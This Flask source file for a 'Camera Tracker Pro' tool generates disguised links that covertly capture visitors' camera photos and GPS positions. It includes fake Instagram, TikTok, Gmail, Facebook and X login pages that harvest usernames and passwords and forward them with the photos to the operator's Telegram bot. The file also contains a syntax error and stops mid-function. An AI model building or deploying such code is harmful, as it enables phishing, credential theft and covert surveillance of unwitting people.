"""
Camera Tracker Pro v4
28 fitur: Rate Limiting, Jadwal, Custom Slug, Short Link,
Batch Generate, Template, Burst Mode, Fake App, Canary, dan lainnya.
"""
from flask import (Flask, request, jsonify, render_template,
                   session, redirect, url_for, make_response)
from functools import wraps
import sqlite3, uuid, os, secrets, base64, json, random, string
from datetime import datetime, timedelta

try:
    import requests as req_lib
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "ganti-secret-key-acak-32-karakter-atau-lebih")

# ── Konfigurasi untuk PythonAnywhere (HTTPS proxy) ───────────────────────────
app.config.update(
    PERMANENT_SESSION_LIFETIME  = timedelta(days=7),
    SESSION_COOKIE_HTTPONLY     = True,
    SESSION_COOKIE_SAMESITE     = "Lax",   # wajib agar cookie dikirim di PythonAnywhere
    SESSION_COOKIE_SECURE       = False,   # False karena Flask menerima via HTTP internal
    PREFERRED_URL_SCHEME        = "https", # supaya url_for() menghasilkan https://
)

APP_PASSWORD = os.getenv("APP_PASSWORD", "admin123")
DB_PATH = "/home/camtracker/camera-tracker/tracker.db"

# ── Fake Social Media Presets ────────────────────────────────────────────────────
FAKE_PRESETS = {
    "instagram": {
        "platform": "instagram",
        "ui": {
            "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png",
            "bg_color": "#fafafa", "card_bg": "#ffffff", "accent_color": "#0095f6",
            "text_color": "#262626", "border_radius": "8px"
        },
        "fields": [
            {"id": "username", "type": "text", "placeholder": "Phone number, username, or email", "label": "Phone number, username, or email"},
            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
        ],
        "buttons": [{"text": "Log In", "action": "submit"}],
        "extras": {"forgot_link": "Forgot password?", "signup_text": "Don't have an account? <a href='#'>Sign up</a>", "footer": "Meta © 2025"},
        "on_submit": {"redirect": "https://www.instagram.com", "delay": 2}
    },
    "tiktok": {
        "platform": "tiktok",
        "ui": {"logo": "https://static.vecteezy.com/system/resources/previews/016/716/450/non_2x/tiktok-icon-free-png.png",
               "bg_color": "#000000", "card_bg": "#1c1c1c", "accent_color": "#ee1d52", "text_color": "#ffffff"},
        "fields": [
            {"id": "email", "type": "text", "placeholder": "Email or username", "label": "Email or username"},
            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
        ],
        "buttons": [{"text": "Log In", "action": "submit"}],
        "extras": {"forgot_link": "Forgot password?", "signup_text": "Don't have an account? <a href='#'>Sign up</a>"},
        "on_submit": {"redirect": "https://www.tiktok.com", "delay": 2}
    },
    "gmail": {
        "platform": "gmail",
        "ui": {"logo": "https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png",
               "bg_color": "#ffffff", "card_bg": "#ffffff", "accent_color": "#1a73e8", "text_color": "#202124"},
        "fields": [
            {"id": "email", "type": "email", "placeholder": "Email or phone", "label": "Email or phone"},
            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
        ],
        "buttons": [{"text": "Next", "action": "submit"}],
        "extras": {"forgot_link": "Forgot email?", "signup_text": "Create account"},
        "on_submit": {"redirect": "https://mail.google.com", "delay": 2}
    },
    "facebook": {
        "platform": "facebook",
        "ui": {"logo": "https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg",
               "bg_color": "#f0f2f5", "card_bg": "#ffffff", "accent_color": "#1877f2", "text_color": "#1c1e21"},
        "fields": [
            {"id": "email", "type": "text", "placeholder": "Email address or phone number", "label": "Email address or phone number"},
            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
        ],
        "buttons": [{"text": "Log In", "action": "submit"}],
        "extras": {"forgot_link": "Forgot password?", "signup_text": "Create new account"},
        "on_submit": {"redirect": "https://www.facebook.com", "delay": 2}
    },
    "twitter": {
        "platform": "twitter",
        "ui": {"logo": "https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_of_Twitter.svg",
               "bg_color": "#ffffff", "card_bg": "#ffffff", "accent_color": "#1d9bf0", "text_color": "#0f1419"},
        "fields": [
            {"id": "username", "type": "text", "placeholder": "Phone, email, or username", "label": "Phone, email, or username"},
            {"id": "password", "type": "password", "placeholder": "Password", "label": "Password"}
        ],
        "buttons": [{"text": "Log in", "action": "submit"}],
        "extras": {"forgot_link": "Forgot password?", "signup_text": "Sign up for X"},
        "on_submit": {"redirect": "https://x.com", "delay": 2}
    }
}

# ── Database ──────────────────────────────────────────────────────────────────

def get_db():
    c = sqlite3.connect(DB_PATH)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS tokens (
            id                 TEXT PRIMARY KEY,
            slug               TEXT DEFAULT '',
            short_code         TEXT DEFAULT '',
            label              TEXT DEFAULT '',
            tags               TEXT DEFAULT '',
            mode               TEXT NOT NULL DEFAULT 'photo',
            canary             INTEGER DEFAULT 0,
            multi_device       INTEGER DEFAULT 1,
            link_title         TEXT DEFAULT '',
            link_description   TEXT DEFAULT '',
            loading_title      TEXT DEFAULT 'Memuat Aplikasi',
            loading_subtitle   TEXT DEFAULT 'Mohon tunggu sebentar...',
            loading_duration   INTEGER DEFAULT 3,
            permission_title   TEXT DEFAULT 'Akses Diperlukan',
            permission_message TEXT DEFAULT 'Aplikasi ini memerlukan akses untuk berjalan.',
            custom_message     TEXT DEFAULT '',
            fake_mode          TEXT DEFAULT '',
            thank_you_title    TEXT DEFAULT '',
            thank_you_msg      TEXT DEFAULT '',
            thank_you_btn      TEXT DEFAULT 'Tutup',
            redirect_url       TEXT DEFAULT '',
            redirect_delay     INTEGER DEFAULT 3,
            theme              TEXT DEFAULT '{}',
            custom_icon        TEXT DEFAULT '',
            camera_facing      TEXT DEFAULT 'user',
            photo_width        INTEGER DEFAULT 640,
            burst_count        INTEGER DEFAULT 1,
            burst_interval     INTEGER DEFAULT 500,
            capture_interval   INTEGER DEFAULT 10,
            auto_delete_hours  INTEGER DEFAULT 0,
            max_access         INTEGER DEFAULT 0,
            access_count       INTEGER DEFAULT 0,
            active_days        TEXT DEFAULT '',
            active_time_start  TEXT DEFAULT '',
            active_time_end    TEXT DEFAULT '',
            active_from        TEXT DEFAULT '',
            created_at         TEXT NOT NULL,
            expires_at         TEXT NOT NULL,
            revoked            INTEGER DEFAULT 0,
            used               INTEGER DEFAULT 0,
            fake_config        TEXT DEFAULT '{}'   -- NEW
        );
        CREATE TABLE IF NOT EXISTS captures (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            token_id     TEXT NOT NULL,
            type         TEXT NOT NULL,
            data         TEXT NOT NULL,
            address      TEXT DEFAULT '',
            captured_at  TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS access_logs (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            token_id     TEXT NOT NULL,
            ip_address   TEXT,
            user_agent   TEXT,
            accessed_at  TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS config (
            key   TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE TABLE IF NOT EXISTS templates (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT NOT NULL,
            config_json TEXT NOT NULL,
            created_at  TEXT NOT NULL
        );
    """)
    # Migrasi untuk database lama
    migrations = [
        "ALTER TABLE tokens ADD COLUMN slug TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN short_code TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN tags TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN canary INTEGER DEFAULT 0",
        "ALTER TABLE tokens ADD COLUMN multi_device INTEGER DEFAULT 1",
        "ALTER TABLE tokens ADD COLUMN fake_mode TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN thank_you_title TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN thank_you_msg TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN thank_you_btn TEXT DEFAULT 'Tutup'",
        "ALTER TABLE tokens ADD COLUMN theme TEXT DEFAULT '{}'",
        "ALTER TABLE tokens ADD COLUMN custom_icon TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN camera_facing TEXT DEFAULT 'user'",
        "ALTER TABLE tokens ADD COLUMN photo_width INTEGER DEFAULT 640",
        "ALTER TABLE tokens ADD COLUMN burst_count INTEGER DEFAULT 1",
        "ALTER TABLE tokens ADD COLUMN burst_interval INTEGER DEFAULT 500",
        "ALTER TABLE tokens ADD COLUMN max_access INTEGER DEFAULT 0",
        "ALTER TABLE tokens ADD COLUMN access_count INTEGER DEFAULT 0",
        "ALTER TABLE tokens ADD COLUMN active_days TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN active_time_start TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN active_time_end TEXT DEFAULT ''",
        "ALTER TABLE tokens ADD COLUMN active_from TEXT DEFAULT ''",
        "ALTER TABLE captures ADD COLUMN address TEXT DEFAULT ''",
        "CREATE TABLE IF NOT EXISTS templates (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, config_json TEXT NOT NULL, created_at TEXT NOT NULL)",
        "ALTER TABLE tokens ADD COLUMN fake_config TEXT DEFAULT '{}'",  -- NEW
    ]
    for m in migrations:
        try: db.execute(m); db.commit()
        except: pass
    db.commit(); db.close()


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_token_by(identifier):
    """Cari token by UUID atau slug."""
    db = get_db()
    row = db.execute("SELECT * FROM tokens WHERE id=? OR (slug!='' AND slug=?)",
                     (identifier, identifier)).fetchone()
    db.close(); return row

def get_cfg(key, default=""):
    db = get_db()
    row = db.execute("SELECT value FROM config WHERE key=?", (key,)).fetchone()
    db.close(); return row["value"] if row else default

def set_cfg(key, value):
    db = get_db()
    db.execute("INSERT OR REPLACE INTO config (key,value) VALUES (?,?)", (key, value))
    db.commit(); db.close()

def gen_short_code():
    """Generate 6-char unique short code."""
    db = get_db()
    for _ in range(20):
        code = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        if not db.execute("SELECT id FROM tokens WHERE short_code=?", (code,)).fetchone():
            db.close(); return code
    db.close()
    return secrets.token_hex(3)

def token_valid(row):
    if not row or row["revoked"]: return False
    return datetime.now() <= datetime.fromisoformat(row["expires_at"])

def check_schedule(row):
    """Cek jadwal waktu aktif. Return (ok, pesan)."""
    tz_off = int(get_cfg("timezone_offset", "7"))
    now    = datetime.utcnow() + timedelta(hours=tz_off)

    # Cek scheduled activation
    if row["active_from"]:
        try:
            af = datetime.fromisoformat(row["active_from"])
            if now < af:
                return False, f"Link belum aktif. Aktif mulai {af.strftime('%d/%m/%Y %H:%M')}"
        except: pass

    # Cek hari aktif
    if row["active_days"]:
        try:
            allowed = json.loads(row["active_days"])  # [0,1,2,3,4] = Sen-Jum (Python: Mon=0)
            if now.weekday() not in allowed:
                days_name = ["Sen","Sel","Rab","Kam","Jum","Sab","Min"]
                aktif = ", ".join(days_name[d] for d in allowed)
                return False, f"Link hanya aktif pada: {aktif}"
        except: pass

    # Cek jam aktif
    if row["active_time_start"] and row["active_time_end"]:
        try:
            t_start = datetime.strptime(row["active_time_start"], "%H:%M").time()
            t_end   = datetime.strptime(row["active_time_end"],   "%H:%M").time()
            t_now   = now.time()
            if not (t_start <= t_now <= t_end):
                return False, f"Link hanya aktif pukul {row['active_time_start']}–{row['active_time_end']}"
        except: pass

    return True, ""

def check_rate_limit(ip, token_id):
    """Cek apakah IP melebihi batas akses. Return (ok, pesan)."""
    max_req = int(get_cfg("rl_max_requests", "0"))
    if max_req == 0: return True, ""
    window  = int(get_cfg("rl_window_minutes", "5"))
    cutoff  = (datetime.now() - timedelta(minutes=window)).isoformat()
    db = get_db()
    count = db.execute(
        "SELECT COUNT(*) FROM access_logs WHERE ip_address=? AND token_id=? AND accessed_at>?",
        (ip, token_id, cutoff)).fetchone()[0]
    db.close()
    if count >= max_req:
        return False, f"Terlalu banyak permintaan dari IP ini. Coba lagi dalam {window} menit."
    return True, ""

def do_auto_delete():
    """Hapus captures lama sesuai auto_delete_hours tiap token."""
    db = get_db()
    rows = db.execute("SELECT id,auto_delete_hours,created_at FROM tokens WHERE auto_delete_hours>0").fetchall()
    for r in rows:
        cutoff = (datetime.fromisoformat(r["created_at"]) + timedelta(hours=r["auto_delete_hours"])).isoformat()
        db.execute("DELETE FROM captures WHERE token_id=? AND captured_at<?", (r["id"], cutoff))
    # Auto-cleanup token expired > 7 hari
    old_cutoff = (datetime.now() - timedelta(days=7)).isoformat()
    db.execute("DELETE FROM access_logs WHERE token_id IN (SELECT id FROM tokens WHERE expires_at<?)", (old_cutoff,))
    db.execute("DELETE FROM captures WHERE token_id IN (SELECT id FROM tokens WHERE expires_at<?)", (old_cutoff,))
    db.execute("DELETE FROM tokens WHERE expires_at<? AND revoked=0", (old_cutoff,))
    db.commit(); db.close()

def telegram_notify(cap_type, data, label, address=""):
    if not REQUESTS_OK: return
    bot = get_cfg("tg_bot_token"); cid = get_cfg("tg_chat_id")
    if not bot or not cid: return
    now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
    lbl = label or "—"
    try:
        if cap_type == "photo":
            raw = base64.b64decode(data.split(",",1)[1] if "," in data else data)
            caption = f"📸 Foto baru\n🏷 {lbl}\n🕐 {now}"
            if address: caption += f"\n📍 {address}"
            req_lib.post(f"https://api.telegram.org/bot{bot}/sendPhoto",
                files={"photo":("p.jpg", raw, "image/jpeg")},
                data={"chat_id": cid, "caption": caption}, timeout=15)
        elif cap_type == "gps":
            g = json.loads(data)
            lat, lng, acc = g["lat"], g["lng"], g.get("accuracy","?")
            text = (f"📍 Lokasi baru\n🏷 {lbl}\n🕐 {now}\n"
                    f"📌 {lat:.6f}, {lng:.6f}\n🎯 ±{int(float(acc))}m\n"
                    f"🗺 https://maps.google.com/?q={lat},{lng}")
            if address: text += f"\n🏘 {address}"
            req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
                data={"chat_id": cid, "text": text}, timeout=10)
        elif cap_type == "fake":
            # Kirim kredensial sebagai teks
            text = f"🔓 New Credentials!\n🏷 {lbl}\n🕐 {now}\n📋 Data: {data}"
            req_lib.post(f"https://api.telegram.org/bot{bot}/sendMessage",
                data={"chat_id": cid, "text": text}, timeout=10)
    except: pass


init_db()


# ── Auth ──────────────────────────────────────────────────────────────────────

def login_required(f):
    @wraps(f)
    def w(*a,**k):
        if not session.get("logged_in"):
            # Jika request dari API (JSON), kembalikan 401 bukan redirect HTML
            if (request.path.startswith("/api/") or
                    request.headers.get("Content-Type","").startswith("application/json") or
                    request.headers.get("X-Requested-With") == "XMLHttpRequest"):
                return jsonify(error="Sesi habis, silakan login ulang.", redirect="/login"), 401
            return redirect(url_for("login"))
        return f(*a,**k)
    return w

@app.route("/")
def index(): return redirect(url_for("dashboard" if session.get("logged_in") else "login"))

@app.route("/login", methods=["GET","POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == APP_PASSWORD:
            session.permanent = True; session["logged_in"] = True
            return redirect(url_for("dashboard"))
        error = "Password salah!"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout(): session.clear(); return redirect(url_for("login"))


# ── Dashboard ─────────────────────────────────────────────────────────────────

@app.route("/dashboard")
@login_required
def dashboard():
    do_auto_delete()
    return render_template("dashboard.html",
        tg_ok=bool(get_cfg("tg_bot_token") and get_cfg("tg_chat_id")))

@app.route("/ping")
def ping(): return jsonify(status="ok", time=datetime.now().isoformat())


# ── Short Link ────────────────────────────────────────────────────────────────

@app.route("/s/<code>")
def short_link(code):
    db = get_db()
    row = db.execute("SELECT id, slug FROM tokens WHERE short_code=?", (code,)).fetchone()
    db.close()
    if not row:
        return render_template("error.html", icon="❌", title="Link Tidak Valid",
                               msg="Short link ini tidak ditemukan."), 404
    target = row["slug"] if row["slug"] else row["id"]
    return redirect(url_for("device_page", identifier=target))


# ── Device Page ───────────────────────────────────────────────────────────────

@app.route("/track/<identifier>")
def device_page(identifier):
    row = get_token_by(identifier)
    ip  = (request.headers.get("X-Forwarded-For", request.remote_addr) or "").split(",")[0].strip()
    ua  = (request.headers.get("User-Agent","") or "")[:300]

    # Validasi dasar
    if not row:
        return render_template("error.html", icon="❌", title="Link Tidak Valid",
                               msg="Link ini tidak ditemukan."), 404

    token_id = row["id"]

    # Rate limiting
    rl_ok, rl_msg = check_rate_limit(ip, token_id)
    if not rl_ok:
        return render_template("error.html", icon="🚫", title="Terlalu Banyak Permintaan",
                               msg=rl_msg), 429

    # Expired / revoked
    if not token_valid(row):
        msg = "Link telah dibatalkan." if row["revoked"] else "Link sudah kadaluarsa."
        return render_template("error.html", icon="⏰", title="Link Tidak Aktif", msg=msg), 410

    # Batas jumlah akses
    if row["max_access"] > 0 and row["access_count"] >= row["max_access"]:
        return render_template("error.html", icon="🔒", title="Batas Akses Tercapai",
                               msg=f"Link ini hanya bisa dibuka {row['max_access']} kali."), 403

    # Jadwal
    sched_ok, sched_msg = check_schedule(row)
    if not sched_ok:
        return render_template("error.html", icon="⏱", title="Link Belum/Tidak Aktif",
                               msg=sched_msg), 403

    # Log akses & increment counter
    db = get_db()
    db.execute("INSERT INTO access_logs (token_id,ip_address,user_agent,accessed_at) VALUES (?,?,?,?)",
               (token_id, ip, ua, datetime.now().isoformat()))
    db.execute("UPDATE tokens SET access_count = access_count + 1 WHERE id=?", (token_id,))
    db.commit(); db.close()

    # Parse theme & fake_config
    try: theme = json.loads(row["theme"] or "{}")
    except: theme = {}
    try: fake_config = json.loads(row["fake_config"] or "{}")
    except: fake_config = {}

    return render_template("device.html",
        token=token_id,
        mode=row["mode"],
        canary=row["canary"],
        link_title=row["link_title"] or "Aplikasi",
        link_description=row["link_description"] or "",
        loading_title=row["loading_title"],
        loading_subtitle=row["loading_subtitle"],
        loading_duration=row["loading_duration"],
        permission_title=row["permission_title"],
        permission_message=row["permission_message"],
        custom_message=row["custom_message"],
        fake_mode=row["fake_mode"] or "",
        thank_you_title=row["thank_you_title"] or "",
        thank_you_msg=row["thank_you_msg"] or "",
        thank_you_btn=row["thank_you_btn"] or "Tutup",
        redirect_url=row["redirect_url"] or "",
        redirect_delay=int(row["redirect_delay"] or 3),
        theme_bg=theme.get("bg",""),
        theme_accent=theme.get("accent",""),
        theme_font=theme.get("font","Inter"),
        custom_icon=row["custom_icon"] or "",
        camera_facing=row["camera_facing"] or "user",
        photo_width=int(row["photo_width"] or 640),
        burst_count=int(row["burst_count"] or 1),
        burst_interval=int(row["burst_interval"] or 500),
        capture_interval=int(row["capture_interval"] or 10),
        fake_config=fake_config)   # NEW


# ── API: Stats ────────────────────────────────────────────────────────────────

@app.route("/api/stats")
@login_required
def get_stats():
    db = get_db()
    now = datetime.now().isoformat()
    total_sessions = db.execute("SELECT COUNT(*) FROM tokens").fetchone()[0]
    active_sessions = db.execute("SELECT COUNT(*) FROM tokens WHERE revoked=0 AND expires_at>?", (now,)).fetchone()[0]
    total_photos = db.execute("SELECT COUNT(*) FROM captures WHERE type='photo'").fetchone()[0]
    total_gps = db.execute("SELECT COUNT(*) FROM captures WHERE type='gps'").fetchone()[0]
    total_fake = db.execute("SELECT COUNT(*) FROM captures WHERE type='fake'").fetchone()[0]  # NEW
    photo_size = db.execute("SELECT SUM(LENGTH(data)) FROM captures WHERE type='photo'").fetchone()[0] or 0
    db.close()
    return jsonify(total_sessions=total_sessions, active_sessions=active_sessions,
                   total_photos=total_photos, total_gps=total_gps,
                   total_fake=total_fake, storage_mb=round(photo_size/1024/1024, 2))


# ── API: Sessions ─────────────────────────────────────────────────────────────

@app.route("/api/sessions")
@login_required
def get_sessions():
    tag_filter  = request.args.get("tag","").strip()
    mode_filter = request.args.get("mode","").strip()
    status_filter = request.args.get("status","").strip()
    search = request.args.get("q","").strip()
    db = get_db()
    rows = db.execute("""
        SELECT t.*,
          (SELECT COUNT(*) FROM captures WHERE token_id=t.id) capture_count,
          (SELECT COUNT(*) FROM access_logs WHERE token_id=t.id) access_count_log
        FROM tokens t ORDER BY t.created_at DESC LIMIT 200
    """).fetchall()
    db.close()
    now = datetime.now().isoformat()
    out = []
    for r in rows:
        status = "revoked" if r["revoked"] else ("expired" if r["expires_at"]<now else "active")
        if status_filter and status != status_filter: continue
        if mode_filter and r["mode"] != mode_filter: continue
        if search and search.lower() not in (r["label"]+r["tags"]+r["link_title"]).lower(): continue
        if tag_filter and tag_filter not in (r["tags"] or "").split(","): continue
        out.append({"id":r["id"],"label":r["label"],"tags":r["tags"],
                    "mode":r["mode"],"canary":r["canary"],
                    "link_title":r["link_title"],"short_code":r["short_code"],
                    "slug":r["slug"],"created_at":r["created_at"],
                    "expires_at":r["expires_at"],"status":status,
                    "capture_count":r["capture_count"],
                    "access_count":r["access_count"],
                    "access_count_log":r["access_count_log"],
                    "max_access":r["max_access"],"used":r["used"]})
    return jsonify(out)


# ── API: Generate Link ────────────────────────────────────────────────────────

@app.route("/api/generate-link", methods=["POST"])
@login_required
def generate_link():
    b = request.json or {}
    token = str(uuid.uuid4()); now = datetime.now()
    exp   = now + timedelta(hours=int(b.get("expires_hours",1)))

    # Custom slug validation
    slug = b.get("slug","").strip().lower().replace(" ","-")
    if slug:
        db = get_db()
        exists = db.execute("SELECT id FROM tokens WHERE slug=?", (slug,)).fetchone()
        db.close()
        if exists: return jsonify(error=f"Slug '{slug}' sudah dipakai"), 400

    short_code = gen_short_code()

    # Theme JSON
    theme = json.dumps({
        "bg":     b.get("theme_bg",""),
        "accent": b.get("theme_accent",""),
        "font":   b.get("theme_font","Inter"),
    })

    # Fake config
    fake_mode = b.get("fake_mode", "")
    fake_config = b.get("fake_config", {})
    if fake_mode == "social" and not fake_config:
        # Jika tidak ada config, gunakan preset default (misal instagram)
        fake_config = FAKE_PRESETS.get("instagram", {})

    db = get_db()
    db.execute("""
        INSERT INTO tokens
        (id, slug, short_code, label, tags, mode, canary, multi_device,
         link_title, link_description, loading_title, loading_subtitle, loading_duration,
         permission_title, permission_message, custom_message,
         fake_mode, thank_you_title, thank_you_msg, thank_you_btn,
         redirect_url, redirect_delay, theme, custom_icon,
         camera_facing, photo_width, burst_count, burst_interval,
         capture_interval, auto_delete_hours, max_access,
         active_days, active_time_start, active_time_end, active_from,
         created_at, expires_at, fake_config)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
    """, (token, slug, short_code,
          b.get("label",""), b.get("tags",""), b.get("mode","photo"),
          int(b.get("canary",0)), int(b.get("multi_device",1)),
          b.get("link_title",""), b.get("link_description",""),
          b.get("loading_title","Memuat Aplikasi"),
          b.get("loading_subtitle","Mohon tunggu sebentar..."),
          int(b.get("loading_duration",3)),
          b.get("permission_title","Akses Diperlukan"),
          b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
          b.get("custom_message",""),
          fake_mode,
          b.get("thank_you_title",""),
          b.get("thank_you_msg",""), b.get("thank_you_btn","Tutup"),
          b.get("redirect_url",""), int(b.get("redirect_delay",3)),
          theme, b.get("custom_icon",""),
          b.get("camera_facing","user"), int(b.get("photo_width",640)),
          int(b.get("burst_count",1)), int(b.get("burst_interval",500)),
          int(b.get("capture_interval",10)), int(b.get("auto_delete_hours",0)),
          int(b.get("max_access",0)),
          b.get("active_days",""), b.get("active_time_start",""), b.get("active_time_end",""),
          b.get("active_from",""),
          now.isoformat(), exp.isoformat(),
          json.dumps(fake_config)))
    db.commit(); db.close()

    base = request.host_url.rstrip("/")
    track_path = slug if slug else token
    return jsonify(
        link=f"{base}/track/{track_path}",
        short_link=f"{base}/s/{short_code}",
        token=token, slug=slug, short_code=short_code,
        mode=b.get("mode","photo"), expires_at=exp.isoformat())


# ── API: Batch Generate ───────────────────────────────────────────────────────

@app.route("/api/generate-batch", methods=["POST"])
@login_required
def generate_batch():
    b = request.json or {}
    count = min(int(b.get("count",1)), 50)  # maks 50 sekaligus
    results = []
    base = request.host_url.rstrip("/")
    for i in range(count):
        b["label"] = f"{b.get('label_prefix','Sesi')} {i+1}"
        b["slug"]  = ""  # slug tidak bisa di-batch
        token = str(uuid.uuid4()); now = datetime.now()
        exp   = now + timedelta(hours=int(b.get("expires_hours",1)))
        short_code = gen_short_code()
        theme = json.dumps({"bg":b.get("theme_bg",""),"accent":b.get("theme_accent",""),"font":b.get("theme_font","Inter")})
        fake_mode = b.get("fake_mode", "")
        fake_config = b.get("fake_config", {})
        if fake_mode == "social" and not fake_config:
            fake_config = FAKE_PRESETS.get("instagram", {})
        db = get_db()
        db.execute("""
            INSERT INTO tokens
            (id,slug,short_code,label,tags,mode,canary,multi_device,
             link_title,link_description,loading_title,loading_subtitle,loading_duration,
             permission_title,permission_message,custom_message,
             fake_mode,thank_you_title,thank_you_msg,thank_you_btn,
             redirect_url,redirect_delay,theme,custom_icon,
             camera_facing,photo_width,burst_count,burst_interval,
             capture_interval,auto_delete_hours,max_access,
             active_days,active_time_start,active_time_end,active_from,
             created_at,expires_at,fake_config)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
        """, (token,"",short_code,b.get("label",""),b.get("tags",""),
              b.get("mode","photo"),int(b.get("canary",0)),int(b.get("multi_device",1)),
              b.get("link_title",""),b.get("link_description",""),
              b.get("loading_title","Memuat Aplikasi"),
              b.get("loading_subtitle","Mohon tunggu sebentar..."),
              int(b.get("loading_duration",3)),
              b.get("permission_title","Akses Diperlukan"),
              b.get("permission_message","Aplikasi ini memerlukan akses untuk berjalan."),
              b.get("custom_message",""),fake_mode,
              b.get("thank_you_title",""),b.get("thank_you_msg",""),b.get("thank_you_btn","Tutup"),
              b.get("redirect_url",""),int(b.get("redirect_delay",3)),
              theme,b.get("custom_icon",""),b.get("camera_facing","user"),
              int(b.get("photo_width",640)),int(b.get("burst_count",1)),
              int(b.get("burst_interval",500)),int(b.get("capture_interval",10)),
              int(b.get("auto_delete_hours",0)),int(b.get("max_access",0)),
              b.get("active_days",""),b.get("active_time_start",""),b.get("active_time_end",""),
              b.get("active_from",""),now.isoformat(),exp.isoformat(),
              json.dumps(fake_config)))
        db.commit(); db.close()
        results.append({"token":token,"label":b["label"],
                         "link":f"{base}/track/{token}",
                         "short_link":f"{base}/s/{short_code}",
                         "short_code":short_code})
    return jsonify(results)


# ── API: Revoke / Delete ──────────────────────────────────────────────────────

@app.route("/api/revoke/<token>", methods=["POST"])
@login_required
def revoke_token(token):
    db = get_db()
    db.execute("UPDATE tokens SET revoked=1 WHERE id=?", (token,))
    db.commit(); db.close(); return jsonify(ok=True)

@app.route("/api/session/<token>", methods=["DELETE"])
@login_required
def delete_session(token):
    db = get_db()
    db.execute("DELETE FROM captures WHERE token_id=?", (token,))
    db.execute("DELETE FROM access_logs WHERE token_id=?", (token,))
    db.execute("DELETE FROM tokens WHERE id=?", (token,))
    db.commit(); db.close(); return jsonify(ok=True)

@app.route("/api/status/<token>")
@login_required
def token_status(token):
    db = get_db(); row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone(); db.close()
    if not row: return jsonify(status="not_found")
    exp = datetime.now() > datetime.fromisoformat(row["expires_at"])
    return jsonify(status="revoked" if row["revoked"] else ("expired" if exp else "active"),
                   mode=row["mode"], access_count=row["access_count"])


# ── API: Bulk Actions ─────────────────────────────────────────────────────────

@app.route("/api/bulk", methods=["POST"])
@login_required
def bulk_action():
    b = request.json or {}
    action = b.get("action")  # revoke, delete
    ids    = b.get("ids", [])
    if not ids: return jsonify(error="Tidak ada ID"), 400
    db = get_db()
    for tid in ids:
        if action == "revoke":
            db.execute("UPDATE tokens SET revoked=1 WHERE id=?", (tid,))
        elif action == "delete":
            db.execute("DELETE FROM captures WHERE token_id=?", (tid,))
            db.execute("DELETE FROM access_logs WHERE token_id=?", (tid,))
            db.execute("DELETE FROM tokens WHERE id=?", (tid,))
    db.commit(); db.close()
    return jsonify(ok=True, count=len(ids))


# ── API: Capture ──────────────────────────────────────────────────────────────

@app.route("/api/capture/<token>", methods=["POST"])
def save_capture(token):
    db = get_db()
    row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone()
    db.close()
    if not token_valid(row): return jsonify(error="invalid"), 404
    if row["canary"]: return jsonify(ok=True)  # Canary: hanya log, jangan simpan capture

    ct = request.content_type or ""
    address = request.args.get("address","")
    if "application/json" in ct:
        data = json.dumps(request.json or {}); cap_type = "gps"
    else:
        data = "data:image/jpeg;base64," + base64.b64encode(request.data).decode()
        cap_type = "photo"

    db = get_db()
    db.execute("INSERT INTO captures (token_id,type,data,address,captured_at) VALUES (?,?,?,?,?)",
               (token, cap_type, data, address, datetime.now().isoformat()))
    db.execute("UPDATE tokens SET used=1 WHERE id=?", (token,))
    db.commit(); db.close()

    try: telegram_notify(cap_type, data, row["label"], address)
    except: pass
    return jsonify(ok=True)

# ── API: Fake Submit (Social Login) ──────────────────────────────────────────

@app.route("/api/fake-submit/<token>", methods=["POST"])
def fake_submit(token):
    """Menerima data dari form login palsu, simpan sebagai capture tipe 'fake'."""
    data = request.json
    if not data:
        return jsonify(error="No data"), 400

    db = get_db()
    row = db.execute("SELECT id, label FROM tokens WHERE id=?", (token,)).fetchone()
    if not row:
        db.close()
        return jsonify(error="Token not found"), 404

    # Simpan sebagai capture
    db.execute(
        "INSERT INTO captures (token_id, type, data, captured_at) VALUES (?, ?, ?, ?)",
        (token, "fake", json.dumps(data), datetime.now().isoformat())
    )
    db.commit()
    db.close()

    # Kirim notifikasi Telegram jika dikonfigurasi
    try:
        label = row["label"] or "—"
        bot = get_cfg("tg_bot_token")
        chat = get_cfg("tg_chat_id")
